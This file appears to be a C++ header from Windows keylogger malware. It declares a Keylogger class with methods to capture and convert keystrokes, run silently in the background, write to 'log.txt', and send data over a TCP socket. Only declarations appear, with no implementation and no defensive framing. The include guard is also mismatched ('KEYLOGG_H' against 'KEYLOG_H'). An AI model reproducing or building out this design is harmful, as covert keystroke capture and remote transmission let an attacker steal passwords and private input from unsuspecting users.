#ifndef KEYLOGG_H
#define KEYLOG_H

#include "master.h"

using namespace std;


class Keylogger
{
    public:

        Keylogger();
        Keylogger(SOCKET &sock);
        //-----------------------------------------------
        VOID setup();
        //-----------------------------------------------
        wstring specialKey(INT &keystroke);
        wstring intToUnicode(INT keystroke);
        //-----------------------------------------------
        static VOID WINAPI StaticThreadStart(); //https://stackoverflow.com/questions/1372967/how-do-you-use-createthread-for-functions-which-are-class-members
        VOID startThread();
         VOID WINAPI directTcp();
        VOID silentBackground();
        //-----------------------------------------------
        ~Keylogger();
        
    private:
        SOCKET a_sock;

        CONST WCHAR a_name_file[8] = L"log.txt";
        HWND a_WindowHandle;
        DWORD a_dwThreadId;
        HKL a_hkl;
     
};

#endif